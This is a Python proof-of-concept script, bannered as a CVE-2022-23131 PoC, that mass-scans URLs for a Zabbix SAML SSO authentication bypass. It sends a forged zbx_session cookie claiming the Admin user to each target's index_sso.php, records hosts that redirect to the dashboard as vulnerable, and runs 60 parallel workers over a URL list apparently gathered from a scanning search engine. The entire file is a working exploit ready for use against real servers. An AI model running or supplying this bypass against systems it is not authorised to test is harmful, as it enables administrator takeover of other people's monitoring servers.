import requests
import re
from threading import Thread
import warnings
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()
def main():
	warnings.filterwarnings('ignore')  # 忽略SSL警告
	print ("单url检测请按1，多url检测请按其他任意值:")
	choose=input()
	if choose=='1':
		print ("input:")
		url=input()
		bp(url)
	else:
		# 读取txt文件
		with open("./url.txt", "r") as f:
			pool = Pool(60)
			for url in f.readlines():
				url = url.strip('\n')
				# print(url)
				pool.apply_async(bp,(url,))
			pool.close()
			pool.join()
				# t = Thread(target=bp, args=(url,))
				# t.start()
def bp(url):
	try:
		if 'http' not in url:
			url='http://'+url
		try:
			r=requests.get(url,verify=False,timeout=5)
			reditList = r.history
			redit=reditList[len(reditList)-1].headers["location"]
			url=redit
		except:
			pass
		if url[-1]=='/':
			url2=url+'index_sso.php'
		else:
			url2=url+'/index_sso.php'
		headers={
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Referer': 'https://fofa.info/',
		'Connection': 'close',
		'Cookie': 'zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0',
		}
		r=requests.get(url2,headers=headers,verify=False,timeout=5)
		#print(r.text)
		reditList = r.history
		if len(reditList)>0:
			redit=reditList[len(reditList)-1].headers["location"]
			if 'dashboard' in redit:
				print('[+]   '+url+'存在漏洞')
				f = open("./success.txt", 'a')
				f.write(url+'\n')
				f.close()
			else:
				print('[-]   '+url+'不存在漏洞,有重定向')	
		else:
			print('[-]   '+url+'不存在漏洞')
	except:
		print('[!]   '+url+'连接失败')
def logo():
	print('''

   _____ __      __ ______      ___    ___  ___   ___        ___   ____  __  ____  __          _____    ____    _____ 
  / ____|\ \    / /|  ____|    |__ \  / _ \|__ \ |__ \      |__ \ |___ \/_ ||___ \/_ |        |  __ \  / __ \  / ____|
 | |      \ \  / / | |__  ______  ) || | | |  ) |   ) |______  ) |  __) || |  __) || | ______ | |__) || |  | || |     
 | |       \ \/ /  |  __||______|/ / | | | | / /   / /|______|/ /  |__ < | | |__ < | ||______||  ___/ | |  | || |     
 | |____    \  /   | |____      / /_ | |_| |/ /_  / /_       / /_  ___) || | ___) || |        | |     | |__| || |____ 
  \_____|    \/    |______|    |____| \___/|____||____|     |____||____/ |_||____/ |_|        |_|      \____/  \_____|
                                                                                                                      
                                                                                                                      
                                 --by dsb V1.0
		''')
if __name__ == '__main__':
	logo()
	main()